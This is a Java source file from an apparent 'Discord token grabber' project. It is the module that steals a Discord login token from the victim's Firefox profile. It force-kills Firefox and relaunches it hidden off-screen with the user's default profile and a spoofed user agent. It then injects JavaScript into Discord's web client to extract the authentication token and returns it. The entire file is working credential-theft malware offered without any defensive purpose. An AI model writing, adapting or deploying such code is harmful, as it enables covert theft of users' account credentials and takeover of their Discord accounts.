package com.github.dedinc.discordtokengrabber.browsers;

import java.io.File;
import java.nio.file.Paths;

import org.openqa.selenium.Dimension;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.Point;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.firefox.ProfilesIni;
import com.github.dedinc.discordtokengrabber.Main;
import com.github.dedinc.discordtokengrabber.utils.Helper;

public class Firefox {
	public String grab() {
		if (!new File(Paths.get(Main.cd, "Users", Main.username, "geckodriver.exe").toString()).exists()) {
			Helper.getWebDriver().getFirefoxDriver();;
		}
		System.setProperty("webdriver.gecko.driver", Paths.get(Main.cd, "Users", Main.username, "geckodriver.exe").toString());
		String[] paths = {Paths.get(Main.cd, "Program Files", "Mozilla Firefox", "firefox.exe").toString(), Paths.get(Main.cd, "Program Files (x86)", "Mozilla Firefox", "firefox.exe").toString()};
		for (int i = 0; i != paths.length; i++) {
			if (new File(paths[i]).exists()) {
				System.setProperty("webdriver.firefox.bin", paths[i]);
				break;
			}
		}
        ProfilesIni profileIni = new ProfilesIni();
        FirefoxProfile profile = profileIni.getProfile("default-release");
        FirefoxOptions options = new FirefoxOptions();        
        options.addPreference("general.useragent.override", Helper.getUserAgents().getAgent());
        options.setProfile(profile);
		try {
			Runtime.getRuntime().exec("taskkill /im firefox.exe /f");
		  } catch (Exception e) {
		}
        FirefoxDriver driver = new FirefoxDriver(options);
		driver.manage().window().setPosition(new Point(99999, 99999));
		driver.manage().window().setSize(new Dimension(0, 0));
		driver.get("https://discord.com/channels/@me");
		JavascriptExecutor js = (JavascriptExecutor) driver;
		String token = (String) js.executeScript("return Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()");
		driver.quit();
		return token;
     }
}
